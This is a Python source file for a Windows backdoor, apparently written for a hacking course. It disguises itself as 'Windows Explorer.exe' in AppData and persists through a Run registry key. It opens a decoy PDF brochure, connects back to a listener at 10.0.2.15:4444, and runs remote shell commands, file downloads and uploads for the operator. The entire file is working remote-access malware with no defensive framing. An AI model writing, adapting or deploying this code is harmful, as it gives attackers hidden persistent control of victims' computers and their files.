import socket
import json
import subprocess
import os
import base64
import shutil
import sys


class Backdoor:
    def __init__(self, ip, port):
        self.get_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def get_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Explorer /t REG_SZ /d "' + file_location + '"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
        except subprocess.CalledProcessError as e:
            return f"[-] Error executing command: {e.output.decode()}"
        except Exception as e:
            return f"[-] Error executing command: {e}"

    def send_data(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def receive_data(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return f"[+] Changed working directory to: {path}"
        except OSError:
            return f"[-] No such directory: {path}"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return "[-] No such file"

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content.encode()))
                return f"[+] Uploaded {path}"
        except FileNotFoundError:
            return "[-] No such file"

    def run(self):
        while True:
            command = self.receive_data()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])

                elif command[0] == "download":
                    try:
                        command_result = self.read_file(command[1])
                    except IndexError:
                        command_result = "[-] No file selected"

                elif command[0] == "upload" and len(command) > 2:
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

            except Exception as e:
                command_result = f"[-] Error during execution: {e}"

            self.send_data(command_result)


if hasattr(sys, '_MEIPASS'):
    filename = sys._MEIPASS + "\\CEH-brochure.pdf"
    subprocess.Popen(filename, shell=True)

try:
    cykitbackdoor = Backdoor("10.0.2.15", 4444)
    cykitbackdoor.run()
except Exception:
    sys.exit()
